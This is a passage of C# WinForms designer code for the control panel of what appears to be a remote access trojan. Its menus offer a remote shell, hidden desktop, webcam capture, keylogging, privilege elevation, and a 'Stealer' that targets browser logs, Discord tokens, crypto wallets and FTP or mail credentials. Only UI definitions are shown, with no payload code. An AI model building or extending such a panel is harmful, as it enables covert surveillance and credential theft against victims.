            this.systemInformationToolStripMenuItem1.Click += new System.EventHandler(this.systemInformationToolStripMenuItem_Click);
            // 
            // remoteShelltoolStripMenuItem
            // 
            this.remoteShelltoolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.remoteShelltoolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.remoteShelltoolStripMenuItem.Image = global::InvokedServer.Properties.Resources.terminal;
            this.remoteShelltoolStripMenuItem.Name = "remoteShelltoolStripMenuItem";
            this.remoteShelltoolStripMenuItem.Size = new System.Drawing.Size(178, 22);
            this.remoteShelltoolStripMenuItem.Text = "Remote Shell";
            this.remoteShelltoolStripMenuItem.Click += new System.EventHandler(this.remoteShellToolStripMenuItem_Click);
            // 
            // taskManagertoolStripMenuItem
            // 
            this.taskManagertoolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.taskManagertoolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.taskManagertoolStripMenuItem.Image = global::InvokedServer.Properties.Resources.application_cascade;
            this.taskManagertoolStripMenuItem.Name = "taskManagertoolStripMenuItem";
            this.taskManagertoolStripMenuItem.Size = new System.Drawing.Size(178, 22);
            this.taskManagertoolStripMenuItem.Text = "Task Manager";
            this.taskManagertoolStripMenuItem.Click += new System.EventHandler(this.taskManagerToolStripMenuItem_Click);
            // 
            // startupManagertoolStripMenuItem
            // 
            this.startupManagertoolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.startupManagertoolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.startupManagertoolStripMenuItem.Image = global::InvokedServer.Properties.Resources.application_edit;
            this.startupManagertoolStripMenuItem.Name = "startupManagertoolStripMenuItem";
            this.startupManagertoolStripMenuItem.Size = new System.Drawing.Size(178, 22);
            this.startupManagertoolStripMenuItem.Text = "Startup Manager";
            this.startupManagertoolStripMenuItem.Click += new System.EventHandler(this.startupManagerToolStripMenuItem_Click);
            // 
            // registryEditortoolStripMenuItem
            // 
            this.registryEditortoolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.registryEditortoolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.registryEditortoolStripMenuItem.Image = global::InvokedServer.Properties.Resources.registry;
            this.registryEditortoolStripMenuItem.Name = "registryEditortoolStripMenuItem";
            this.registryEditortoolStripMenuItem.Size = new System.Drawing.Size(178, 22);
            this.registryEditortoolStripMenuItem.Text = "Registry Editor";
            this.registryEditortoolStripMenuItem.Click += new System.EventHandler(this.registryEditorToolStripMenuItem_Click);
            // 
            // toolStripMenuItem2
            // 
            this.toolStripMenuItem2.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.hiddenDesktopHVNCToolStripMenuItem,
            this.remoteWebcamToolStripMenuItem,
            this.offlineKeyloggerToolStripMenuItem,
            this.toolStripMenuItem5});
            this.toolStripMenuItem2.ForeColor = System.Drawing.SystemColors.Control;
            this.toolStripMenuItem2.Image = global::InvokedServer.Properties.Resources.system_monitor;
            this.toolStripMenuItem2.Name = "toolStripMenuItem2";
            this.toolStripMenuItem2.Size = new System.Drawing.Size(161, 22);
            this.toolStripMenuItem2.Text = "Surveillance";
            this.toolStripMenuItem2.Click += new System.EventHandler(this.toolStripMenuItem2_Click);
            // 
            // hiddenDesktopHVNCToolStripMenuItem
            // 
            this.hiddenDesktopHVNCToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.hiddenDesktopHVNCToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.hiddenDesktopHVNCToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.hvnc2;
            this.hiddenDesktopHVNCToolStripMenuItem.Name = "hiddenDesktopHVNCToolStripMenuItem";
            this.hiddenDesktopHVNCToolStripMenuItem.Size = new System.Drawing.Size(203, 22);
            this.hiddenDesktopHVNCToolStripMenuItem.Text = "Hidden Desktop (HVNC)";
            this.hiddenDesktopHVNCToolStripMenuItem.Click += new System.EventHandler(this.hVNCToolStripMenuItem_Click);
            // 
            // remoteWebcamToolStripMenuItem
            // 
            this.remoteWebcamToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.remoteWebcamToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.remoteWebcamToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.webcam;
            this.remoteWebcamToolStripMenuItem.Name = "remoteWebcamToolStripMenuItem";
            this.remoteWebcamToolStripMenuItem.Size = new System.Drawing.Size(203, 22);
            this.remoteWebcamToolStripMenuItem.Text = "Remote Webcam";
            this.remoteWebcamToolStripMenuItem.Click += new System.EventHandler(this.webcamToolStripMenuItem_Click);
            // 
            // offlineKeyloggerToolStripMenuItem
            // 
            this.offlineKeyloggerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.offlineKeyloggerToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.offlineKeyloggerToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.keyboard_magnify;
            this.offlineKeyloggerToolStripMenuItem.Name = "offlineKeyloggerToolStripMenuItem";
            this.offlineKeyloggerToolStripMenuItem.Size = new System.Drawing.Size(203, 22);
            this.offlineKeyloggerToolStripMenuItem.Text = "Offline Keylogger";
            this.offlineKeyloggerToolStripMenuItem.Click += new System.EventHandler(this.keyloggerStripMenuItem_Click);
            // 
            // toolStripMenuItem5
            // 
            this.toolStripMenuItem5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.toolStripMenuItem5.ForeColor = System.Drawing.SystemColors.Control;
            this.toolStripMenuItem5.Image = global::InvokedServer.Properties.Resources.ui_text_field_password;
            this.toolStripMenuItem5.Name = "toolStripMenuItem5";
            this.toolStripMenuItem5.Size = new System.Drawing.Size(203, 22);
            this.toolStripMenuItem5.Text = "Passwords";
            this.toolStripMenuItem5.Click += new System.EventHandler(this.passwordRecoveryToolStripMenuItem_Click);
            // 
            // networkDropdown
            // 
            this.networkDropdown.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.connectionsToolStripMenuItem,
            this.reverseProxyToolStripMenuItem,
            this.toolStripSeparator2,
            this.toolStripMenuItem3,
            this.toolStripMenuItem4});
            this.networkDropdown.ForeColor = System.Drawing.SystemColors.Control;
            this.networkDropdown.Image = global::InvokedServer.Properties.Resources.chart_line;
            this.networkDropdown.Name = "networkDropdown";
            this.networkDropdown.Size = new System.Drawing.Size(161, 22);
            this.networkDropdown.Text = "Network";
            // 
            // connectionsToolStripMenuItem
            // 
            this.connectionsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.connectionsToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.connectionsToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.transmit_blue;
            this.connectionsToolStripMenuItem.Name = "connectionsToolStripMenuItem";
            this.connectionsToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
            this.connectionsToolStripMenuItem.Text = "TCP Connections";
            this.connectionsToolStripMenuItem.Click += new System.EventHandler(this.connectionsToolStripMenuItem_Click);
            // 
            // reverseProxyToolStripMenuItem
            // 
            this.reverseProxyToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.reverseProxyToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.reverseProxyToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.server_link;
            this.reverseProxyToolStripMenuItem.Name = "reverseProxyToolStripMenuItem";
            this.reverseProxyToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
            this.reverseProxyToolStripMenuItem.Text = "Reverse Proxy";
            this.reverseProxyToolStripMenuItem.Click += new System.EventHandler(this.reverseProxyToolStripMenuItem_Click);
            // 
            // toolStripSeparator2
            // 
            this.toolStripSeparator2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.toolStripSeparator2.Name = "toolStripSeparator2";
            this.toolStripSeparator2.Size = new System.Drawing.Size(168, 6);
            // 
            // toolStripMenuItem3
            // 
            this.toolStripMenuItem3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.toolStripMenuItem3.ForeColor = System.Drawing.SystemColors.Control;
            this.toolStripMenuItem3.Image = global::InvokedServer.Properties.Resources.application;
            this.toolStripMenuItem3.Name = "toolStripMenuItem3";
            this.toolStripMenuItem3.Size = new System.Drawing.Size(171, 22);
            this.toolStripMenuItem3.Text = "Show Messagebox";
            this.toolStripMenuItem3.Click += new System.EventHandler(this.showMessageboxToolStripMenuItem_Click);
            // 
            // toolStripMenuItem4
            // 
            this.toolStripMenuItem4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.toolStripMenuItem4.ForeColor = System.Drawing.SystemColors.Control;
            this.toolStripMenuItem4.Image = global::InvokedServer.Properties.Resources.world_link;
            this.toolStripMenuItem4.Name = "toolStripMenuItem4";
            this.toolStripMenuItem4.Size = new System.Drawing.Size(171, 22);
            this.toolStripMenuItem4.Text = "Send to Website";
            this.toolStripMenuItem4.Click += new System.EventHandler(this.visitWebsiteToolStripMenuItem_Click);
            // 
            // stealerDropdown
            // 
            this.stealerDropdown.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.stealerOptionstoolStripMenuItem,
            this.toolStripSeparator1,
            this.BrowsersToolStripMenuItem,
            this.discordTokenToolStripMenuItem,
            this.cryptoDataToolStripMenuItem,
            this.telegramInfoToolStripMenuItem,
            this.steamToolStripMenuItem,
            this.oBSKeysToolStripMenuItem,
            this.ngrokAuthKeysToolStripMenuItem,
            this.fileZillaToolStripMenuItem,
            this.foxmailToolStripMenuItem,
            this.winSCPToolStripMenuItem});
            this.stealerDropdown.ForeColor = System.Drawing.SystemColors.Control;
            this.stealerDropdown.Image = global::InvokedServer.Properties.Resources.user_thief_baldie;
            this.stealerDropdown.Name = "stealerDropdown";
            this.stealerDropdown.Size = new System.Drawing.Size(161, 22);
            this.stealerDropdown.Text = "Stealer";
            // 
            // stealerOptionstoolStripMenuItem
            // 
            this.stealerOptionstoolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.stealerOptionstoolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.stealerOptionstoolStripMenuItem.Image = global::InvokedServer.Properties.Resources.toolbox;
            this.stealerOptionstoolStripMenuItem.Name = "stealerOptionstoolStripMenuItem";
            this.stealerOptionstoolStripMenuItem.Size = new System.Drawing.Size(168, 22);
            this.stealerOptionstoolStripMenuItem.Text = "Customise Stealer";
            this.stealerOptionstoolStripMenuItem.Click += new System.EventHandler(this.stealerOptionstoolStripMenuItem_Click);
            // 
            // toolStripSeparator1
            // 
            this.toolStripSeparator1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.toolStripSeparator1.ForeColor = System.Drawing.SystemColors.ActiveCaption;
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new System.Drawing.Size(165, 6);
            // 
            // BrowsersToolStripMenuItem
            // 
            this.BrowsersToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.BrowsersToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.BrowsersToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.Browsers_16;
            this.BrowsersToolStripMenuItem.Name = "BrowsersToolStripMenuItem";
            this.BrowsersToolStripMenuItem.Size = new System.Drawing.Size(168, 22);
            this.BrowsersToolStripMenuItem.Text = "Browser Logs";
            this.BrowsersToolStripMenuItem.Click += new System.EventHandler(this.BrowsersToolStripMenuItem_Click);
            // 
            // discordTokenToolStripMenuItem
            // 
            this.discordTokenToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.discordTokenToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.discordTokenToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.Discord_16;
            this.discordTokenToolStripMenuItem.Name = "discordTokenToolStripMenuItem";
            this.discordTokenToolStripMenuItem.Size = new System.Drawing.Size(168, 22);
            this.discordTokenToolStripMenuItem.Text = "Discord Tokens";
            this.discordTokenToolStripMenuItem.Click += new System.EventHandler(this.discordTokenToolStripMenuItem_Click);
            // 
            // cryptoDataToolStripMenuItem
            // 
            this.cryptoDataToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.cryptoDataToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.cryptoDataToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.crypto;
            this.cryptoDataToolStripMenuItem.Name = "cryptoDataToolStripMenuItem";
            this.cryptoDataToolStripMenuItem.Size = new System.Drawing.Size(168, 22);
            this.cryptoDataToolStripMenuItem.Text = "Crypto Data";
            this.cryptoDataToolStripMenuItem.Click += new System.EventHandler(this.cryptoDataToolStripMenuItem_Click);
            // 
            // telegramInfoToolStripMenuItem
            // 
            this.telegramInfoToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.telegramInfoToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.telegramInfoToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.telegram;
            this.telegramInfoToolStripMenuItem.Name = "telegramInfoToolStripMenuItem";
            this.telegramInfoToolStripMenuItem.Size = new System.Drawing.Size(168, 22);
            this.telegramInfoToolStripMenuItem.Text = "Telegram Info";
            this.telegramInfoToolStripMenuItem.Click += new System.EventHandler(this.telegramInfoToolStripMenuItem_Click);
            // 
            // steamToolStripMenuItem
            // 
            this.steamToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.steamToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.steamToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.steam;
            this.steamToolStripMenuItem.Name = "steamToolStripMenuItem";
            this.steamToolStripMenuItem.Size = new System.Drawing.Size(168, 22);
            this.steamToolStripMenuItem.Text = "Steam";
            this.steamToolStripMenuItem.Click += new System.EventHandler(this.steamToolStripMenuItem_Click);
            // 
            // oBSKeysToolStripMenuItem
            // 
            this.oBSKeysToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.oBSKeysToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.oBSKeysToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.obs;
            this.oBSKeysToolStripMenuItem.Name = "oBSKeysToolStripMenuItem";
            this.oBSKeysToolStripMenuItem.Size = new System.Drawing.Size(168, 22);
            this.oBSKeysToolStripMenuItem.Text = "OBS Keys";
            this.oBSKeysToolStripMenuItem.Click += new System.EventHandler(this.oBSKeysToolStripMenuItem_Click);
            // 
            // ngrokAuthKeysToolStripMenuItem
            // 
            this.ngrokAuthKeysToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.ngrokAuthKeysToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.ngrokAuthKeysToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.ngrok;
            this.ngrokAuthKeysToolStripMenuItem.Name = "ngrokAuthKeysToolStripMenuItem";
            this.ngrokAuthKeysToolStripMenuItem.Size = new System.Drawing.Size(168, 22);
            this.ngrokAuthKeysToolStripMenuItem.Text = "Ngrok Auth Keys";
            this.ngrokAuthKeysToolStripMenuItem.Click += new System.EventHandler(this.ngrokAuthKeysToolStripMenuItem_Click);
            // 
            // fileZillaToolStripMenuItem
            // 
            this.fileZillaToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.fileZillaToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.fileZillaToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.filazilla;
            this.fileZillaToolStripMenuItem.Name = "fileZillaToolStripMenuItem";
            this.fileZillaToolStripMenuItem.Size = new System.Drawing.Size(168, 22);
            this.fileZillaToolStripMenuItem.Text = "FileZilla";
            this.fileZillaToolStripMenuItem.Click += new System.EventHandler(this.fileZillaToolStripMenuItem_Click);
            // 
            // foxmailToolStripMenuItem
            // 
            this.foxmailToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.foxmailToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.foxmailToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.foxmail;
            this.foxmailToolStripMenuItem.Name = "foxmailToolStripMenuItem";
            this.foxmailToolStripMenuItem.Size = new System.Drawing.Size(168, 22);
            this.foxmailToolStripMenuItem.Text = "Foxmail";
            this.foxmailToolStripMenuItem.Click += new System.EventHandler(this.foxmailToolStripMenuItem_Click);
            // 
            // winSCPToolStripMenuItem
            // 
            this.winSCPToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.winSCPToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.winSCPToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.winscp;
            this.winSCPToolStripMenuItem.Name = "winSCPToolStripMenuItem";
            this.winSCPToolStripMenuItem.Size = new System.Drawing.Size(168, 22);
            this.winSCPToolStripMenuItem.Text = "WinSCP";
            this.winSCPToolStripMenuItem.Click += new System.EventHandler(this.winSCPToolStripMenuItem_Click);
            // 
            // miscellaneousToolStripMenuItem
            // 
            this.miscellaneousToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.pluginManagerToolStripMenuItem,
            this.resetSurvivalToolStripMenuItem1});
            this.miscellaneousToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.miscellaneousToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.wrench;
            this.miscellaneousToolStripMenuItem.Name = "miscellaneousToolStripMenuItem";
            this.miscellaneousToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.miscellaneousToolStripMenuItem.Text = "Miscellaneous";
            // 
            // pluginManagerToolStripMenuItem
            // 
            this.pluginManagerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.pluginManagerToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.pluginManagerToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.plugin;
            this.pluginManagerToolStripMenuItem.Name = "pluginManagerToolStripMenuItem";
            this.pluginManagerToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
            this.pluginManagerToolStripMenuItem.Text = "Plugin Manager";
            this.pluginManagerToolStripMenuItem.Click += new System.EventHandler(this.ViewLoadedPluginsStripMenuItem_Click);
            // 
            // resetSurvivalToolStripMenuItem1
            // 
            this.resetSurvivalToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.resetSurvivalToolStripMenuItem1.ForeColor = System.Drawing.SystemColors.Control;
            this.resetSurvivalToolStripMenuItem1.Image = global::InvokedServer.Properties.Resources.anchor;
            this.resetSurvivalToolStripMenuItem1.Name = "resetSurvivalToolStripMenuItem1";
            this.resetSurvivalToolStripMenuItem1.Size = new System.Drawing.Size(178, 22);
            this.resetSurvivalToolStripMenuItem1.Text = "Reset Survival Panel";
            this.resetSurvivalToolStripMenuItem1.Click += new System.EventHandler(this.resetSurvivalPanelToolStripMenuItem_Click);
            // 
            // toolStripSeparator3
            // 
            this.toolStripSeparator3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.toolStripSeparator3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.toolStripSeparator3.MergeIndex = 0;
            this.toolStripSeparator3.Name = "toolStripSeparator3";
            this.toolStripSeparator3.Size = new System.Drawing.Size(158, 6);
            // 
            // actionsToolStripMenuItem
            // 
            this.actionsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.shutdownToolStripMenuItem,
            this.restartToolStripMenuItem,
            this.standbyToolStripMenuItem});
            this.actionsToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.actionsToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.power2;
            this.actionsToolStripMenuItem.Name = "actionsToolStripMenuItem";
            this.actionsToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.actionsToolStripMenuItem.Text = "Power Manager";
            // 
            // shutdownToolStripMenuItem
            // 
            this.shutdownToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.shutdownToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.shutdownToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.shutdown;
            this.shutdownToolStripMenuItem.Name = "shutdownToolStripMenuItem";
            this.shutdownToolStripMenuItem.Size = new System.Drawing.Size(128, 22);
            this.shutdownToolStripMenuItem.Text = "Shutdown";
            this.shutdownToolStripMenuItem.Click += new System.EventHandler(this.shutdownToolStripMenuItem_Click);
            // 
            // restartToolStripMenuItem
            // 
            this.restartToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.restartToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.restartToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.restart;
            this.restartToolStripMenuItem.Name = "restartToolStripMenuItem";
            this.restartToolStripMenuItem.Size = new System.Drawing.Size(128, 22);
            this.restartToolStripMenuItem.Text = "Restart";
            this.restartToolStripMenuItem.Click += new System.EventHandler(this.restartToolStripMenuItem_Click);
            // 
            // standbyToolStripMenuItem
            // 
            this.standbyToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.standbyToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.standbyToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.standby;
            this.standbyToolStripMenuItem.Name = "standbyToolStripMenuItem";
            this.standbyToolStripMenuItem.Size = new System.Drawing.Size(128, 22);
            this.standbyToolStripMenuItem.Text = "Standby";
            this.standbyToolStripMenuItem.Click += new System.EventHandler(this.standbyToolStripMenuItem_Click);
            // 
            // connectionToolStripMenuItem
            // 
            this.connectionToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.elevateClientPermissionsToolStripMenuItem,
            this.updateToolStripMenuItem,
            this.reconnectToolStripMenuItem,
            this.disconnectToolStripMenuItem,
            this.uninstallToolStripMenuItem,
            this.removeOfflineClientToolStripMenuItem});
            this.connectionToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.connectionToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.connect;
            this.connectionToolStripMenuItem.Name = "connectionToolStripMenuItem";
            this.connectionToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.connectionToolStripMenuItem.Text = "Connection";
            // 
            // elevateClientPermissionsToolStripMenuItem
            // 
            this.elevateClientPermissionsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.elevateClientPermissionsToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.elevateClientPermissionsToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.uac_shield;
            this.elevateClientPermissionsToolStripMenuItem.Name = "elevateClientPermissionsToolStripMenuItem";
            this.elevateClientPermissionsToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
            this.elevateClientPermissionsToolStripMenuItem.Text = "Elevate Client Permissions";
            this.elevateClientPermissionsToolStripMenuItem.Click += new System.EventHandler(this.elevateClientPermissionsToolStripMenuItem_Click);
            // 
            // updateToolStripMenuItem
            // 
            this.updateToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.updateToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.updateToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.server_add;
            this.updateToolStripMenuItem.Name = "updateToolStripMenuItem";
            this.updateToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
            this.updateToolStripMenuItem.Text = "Update";
            this.updateToolStripMenuItem.Click += new System.EventHandler(this.updateToolStripMenuItem_Click);
            // 
            // reconnectToolStripMenuItem
            // 
            this.reconnectToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.reconnectToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.reconnectToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.server_go;
            this.reconnectToolStripMenuItem.Name = "reconnectToolStripMenuItem";
            this.reconnectToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
            this.reconnectToolStripMenuItem.Text = "Reconnect";
            this.reconnectToolStripMenuItem.Click += new System.EventHandler(this.reconnectToolStripMenuItem_Click);
            // 
            // disconnectToolStripMenuItem
            // 
            this.disconnectToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.disconnectToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.disconnectToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.server_disconnect;
            this.disconnectToolStripMenuItem.Name = "disconnectToolStripMenuItem";
            this.disconnectToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
            this.disconnectToolStripMenuItem.Text = "Disconnect";
            this.disconnectToolStripMenuItem.Click += new System.EventHandler(this.disconnectToolStripMenuItem_Click);
            // 
            // uninstallToolStripMenuItem
            // 
            this.uninstallToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.uninstallToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.uninstallToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.server_delete;
            this.uninstallToolStripMenuItem.Name = "uninstallToolStripMenuItem";
            this.uninstallToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
            this.uninstallToolStripMenuItem.Text = "Uninstall";
            this.uninstallToolStripMenuItem.Click += new System.EventHandler(this.uninstallToolStripMenuItem_Click);
            // 
            // removeOfflineClientToolStripMenuItem
            // 
            this.removeOfflineClientToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.removeOfflineClientToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.removeOfflineClientToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.cross;
            this.removeOfflineClientToolStripMenuItem.Name = "removeOfflineClientToolStripMenuItem";
            this.removeOfflineClientToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
            this.removeOfflineClientToolStripMenuItem.Text = "Remove Offline Client";
            this.removeOfflineClientToolStripMenuItem.Click += new System.EventHandler(this.removeOfflineClientToolStripMenuItem_Click);
            // 
            // selectAllToolStripMenuItem
            // 
            this.selectAllToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.selectAllToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.zones;
            this.selectAllToolStripMenuItem.Name = "selectAllToolStripMenuItem";
            this.selectAllToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.selectAllToolStripMenuItem.Text = "Select All";
            this.selectAllToolStripMenuItem.Click += new System.EventHandler(this.selectAllToolStripMenuItem_Click);
            // 
            // imageTabs
            // 
            this.imageTabs.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imageTabs.ImageStream")));
            this.imageTabs.TransparentColor = System.Drawing.Color.Transparent;
